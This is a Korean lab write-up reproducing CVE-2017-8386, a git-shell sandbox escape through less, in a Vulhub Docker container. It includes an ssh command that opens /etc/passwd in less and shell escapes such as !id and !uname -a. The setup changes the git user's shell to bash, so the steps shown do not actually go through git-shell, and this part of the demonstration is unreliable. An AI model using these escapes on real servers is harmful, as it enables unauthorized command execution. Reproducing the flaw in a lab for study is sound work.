# CVE-2017-8386: git-shell Sandbox Bypass to RCE PoC
정수진(@suz1n)

## 개요
Git-shell은 SSH를 통해 제한된 git 명령만 허용하는 환경을 제공합니다. 하지만 특정 버전의 git-shell(2.12.2 등)에서는 `less` 명령어를 악용해 sandbox를 우회하고 시스템 명령어를 실행할 수 있는 취약점(CVE-2017-8386)이 존재합니다.

본 보고서는 해당 취약점에 대한 PoC를 진행하고 과정을 정리한 것입니다.

## 환경 구축

### 사용 도구 및 버전
- Docker: 24.0.7
- Docker-Compose: v2.34.0
- Host OS: macOS
- Target OS: Ubuntu 16.04 (컨테이너 내부)
- Git Version: 2.12.2
- SSH Server

### Vulhub 레포지토리 클론
`git clone https://github.com/phith0n/vulhub.git`

`cd vulhub/git/CVE-2017-8386/`
![Image1](https://github.com/user-attachments/assets/1f65fb3f-232e-4db4-b410-07f1a87f10a2)
### docker-compose.yml 및 Dockerfile 구성
	• Ubuntu 16.04 베이스 이미지
	• Git 2.12.2 소스 설치
	• OpenSSH 서버 설치 및 실행
	• git-shell 환경 설정 (git 사용자 생성)

### 컨테이너 빌드 및 실행
`docker-compose build`


`docker-compose up -d`


`docker ps`


	• 컨테이너 실행 확인 (git-shell-cve-2017-8386)
![Image2](https://github.com/user-attachments/assets/ca0e76e1-ccea-4d71-b34e-055e9fd4a803)
### SSH 키 등록 및 환경 설정
	1. 로컬에서 id_rsa.pub 생성 및 복사
	2. 컨테이너 내부 접속 및 git 사용자로 전환
	3. authorized_keys 등록
`docker exec -it git-shell-cve-2017-8386 /bin/bash`


`chsh -s /bin/bash git`


`su git`


`mkdir -p ~/.ssh`


`chmod 700 ~/.ssh`


`touch ~/.ssh/authorized_keys`


`chmod 600 ~/.ssh/authorized_keys`


`vim ~/.ssh/authorized_keys`

![Image3](https://github.com/user-attachments/assets/82ed4833-7d07-4b50-a6ec-fa663761ff16)
### 추가 패키지 설치
`apt update`


`apt install less -y`


`apt install man-db -y`


	• PoC 수행을 위해 less, man 패키지 설치 완료

## PoC 과정

### 정상적인 SSH 접속
`ssh -p 3322 -i id_rsa -t git@127.0.0.1 "less /etc/passwd"`


• less 화면 진입 성공


• ! 명령어를 통해 시스템 명령어 실행 가능


### 명령어 실행 (sandbox 우회)
• !id -> 사용자 ID, 그룹 ID 출력
![first_execute.png](https://github.com/suz1n/WHS3_vulhub/blob/main/first_execute.png)


• !whoami -> 현재 사용자(git)


• !uname -a -> 시스템 커널 정보 출력


• !ls /home/git -> git 홈 디렉토리 파일 목록 출력


## 분석
	• git-shell 환경에서는 사용자가 시스템 명령어를 실행할 수 없게 제한함.
	• 그러나 `git-upload-archive --help` 명령어를 통해 내부적으로 less 호출이 가능.
	• less 명령어는 ! 기능을 통해 시스템 쉘 명령 실행을 지원.
	• 결과적으로 git-shell sandbox를 우회하여 임의 명령어 실행이 가능함.

## 레퍼런스
• Insinuator 블로그: https://insinuator.net/2017/05/git-shell-bypass-by-abusing-less-cve-2017-8386/


• Vulhub GitHub Repository: https://github.com/phith0n/vulhub

## GitHub 레포지토리 링크
https://github.com/suz1n/WHS3_vulhub
